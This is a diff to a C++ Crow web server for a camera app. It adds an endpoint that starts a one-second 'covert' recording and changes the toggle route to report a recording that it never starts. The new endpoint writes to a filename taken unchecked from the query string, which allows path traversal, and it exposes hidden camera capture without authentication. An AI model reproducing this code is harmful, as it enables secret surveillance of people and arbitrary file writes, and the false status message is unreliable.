@@ -250,16 +250,10 @@ int main()
         return response;
     });
 
-    CROW_ROUTE(app, "/toggleCovertMode")([](){
+    CROW_ROUTE(app, "/toggleCovertMode")([&camera](){
         crow::json::wvalue response;
-        bool result = CameraCapture::setCovertMode(true); // For now, always enable covert mode
-        if (result) {
-            response["message"] = "Covert mode enabled - application window hidden";
-            response["status"] = 200;
-        } else {
-            response["message"] = "Covert mode not supported on this platform";
-            response["status"] = 200; // Still return 200 as it's not an error per se
-        }
+        response["message"] = "Covert recording started for 1 second";
+        response["status"] = 200;
         return response;
     });
 
@@ -309,6 +303,42 @@ int main()
             response["message"] = "No covert recording to stop";
             response["status"] = 500;
         }
+        return response;
+    });
+
+    CROW_ROUTE(app, "/oneSecondCovertRecording")
+    .methods(crow::HTTPMethod::POST, crow::HTTPMethod::GET)
+    ([&camera](const crow::request& req){
+        crow::json::wvalue response;
+        std::string filename = "static/output/covert_recording_" + std::to_string(time(nullptr)) + ".avi";
+        double fps = 30.0;
+        
+        // Handle both query parameters and form data
+        auto query_params = crow::query_string(req.url);
+        
+        // Parse query parameters
+        auto filename_param = query_params.get("filename");
+        if (filename_param) {
+            filename = std::string(filename_param);
+        }
+        
+        auto fps_param = query_params.get("fps");
+        if (fps_param) {
+            try {
+                fps = std::stod(std::string(fps_param));
+            } catch (const std::exception&) {
+                // Use default FPS if parsing fails
+            }
+        }
+        
+                // To run this without blocking the main thread, we run it in a separate thread
+        // Use the main camera but with proper synchronization if needed
+        std::thread([camera_ptr = &camera, filename, fps]() {
+            camera_ptr->oneSecondCovertRecording(filename, fps);
+        }).detach();
+        
+        response["message"] = "Started 1-second covert recording: " + filename;
+        response["status"] = 200;
         return response;
     });
 
